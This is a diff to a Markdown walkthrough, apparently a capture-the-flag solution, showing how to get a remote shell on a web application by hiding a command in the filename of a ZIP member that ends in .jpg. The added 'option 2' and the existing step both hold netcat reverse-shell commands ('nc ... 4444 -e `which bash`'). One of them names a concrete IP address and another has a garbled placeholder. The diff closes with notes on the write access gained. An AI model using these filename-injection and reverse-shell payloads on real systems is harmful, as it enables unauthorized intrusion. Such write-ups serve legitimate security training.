@@ -46,8 +46,8 @@ GREETZ=JackFrostWasHere
 ```
 
 ## Full Interactive Remote Shell
+**option 1**
 Create a ZIP file including an empty jpg file:
-**easy option**
 ```
 touch joergen.jpg
 zip joergen.zip joergen.jpg
@@ -55,6 +55,12 @@ zip joergen.zip joergen.jpg
 Modify the contained filename to one with the shell command for the reverse shell (filename needs to end with an image extention as the application checks for that):
 ```
 printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
+```
+
+**option 2**
+```
+touch \'\;nc\ <your IP address68\ 4444\ -e\ \`which\ bash\`\;\'.jpg
+zip joergen.zip \'\;nc\ 93.211.51.68\ 4444\ -e\ \`which\ bash\`\;\'.jpg
 ```
 
 Start the reverse shell listener on your local device:
@@ -69,7 +75,7 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE5NTI5Nzc0MiwxNDQwMDk3MDgzLC05Mz
+eyJoaXN0b3J5IjpbMTQzNjYyNzQwMywxNDQwMDk3MDgzLC05Mz
 U4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNywtMTc2MzU0
 MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5MzcyMDQzOS
 wxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOTc0MTEsLTU3
